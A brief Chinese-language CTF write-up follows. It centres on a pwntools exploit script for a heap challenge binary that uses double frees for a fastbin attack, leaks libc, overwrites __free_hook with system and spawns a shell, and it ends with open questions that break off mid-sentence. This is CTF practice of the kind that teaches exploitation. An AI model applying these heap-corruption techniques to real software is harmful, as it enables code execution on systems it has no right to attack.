# 知识点
- fastbin attack
- "fake" house of orange

# 收获
- gdb 源码级调试glibc
- house of orange 基本原理
## gdb 源码级调试
## house of orange 基本原理

# exp
```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"
io = process("./pwn")#,env={"LD_PRELOAD":"./libc.so.6"}
def add(idx,size,content):
    io.sendline("1")
    io.recvuntil("index\n")
    io.sendline(str(idx))
    io.recvuntil("size\n")
    io.sendline(str(size))
    io.recvuntil("something\n")
    io.sendline(content)
    io.recvuntil("gift :")
    heap_addr = io.recvline()
    return heap_addr
def remove(idx):
    io.sendline("2")
    io.recvuntil("index")
    io.sendline(str(idx))

heap_addr = int(add(0,0x50,"/bin/sh\x00"),16)
add(1, 0x48, 'aaa\x80bbb')

top_addr = heap_addr + 160

remove(0)
remove(0)
remove(0)
add(2, 0x50, p64(top_addr)*2)
add(3, 0x50, p64(top_addr)*2)
add(4, 0x50, p64(0xf1)*2)

for i in range(8):
    remove(1)
for i in range(8):
    remove(0)

add(5, 0x78, 'aaa\x80bbb')
gdb.attach(io)
add(6, 0x78, 'aaa\x80bbb')
add(7,0x48,'emmm')

libc_base = int(add(8,0x48,p64(top_addr)*2),16)- 4111520
#libc_base = int(add(8,0x48,"123456"),16)- 4111520 #???????? this add modify top chunk addr ??
libc = ELF("./mlibc")
system_addr = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
print("[+]system addr:0x%x"%system_addr)
print("[+]free_hook addr:0x%x"%free_hook)

remove(0)
remove(0)
remove(0)

add(9,0x50,p64(free_hook)*2)
add(10,0x50,p64(free_hook)*2)
add(11,0x50,p64(system_addr))
add(12,0x30,"/bin/sh\x00")
remove(12)
io.interactive()

```

# 待解决
1. 为什么`libc_base = int(add(8,0x48,"12345"),16)- 4111520`会修改topchunk的指针？
2. 为什么top chunk 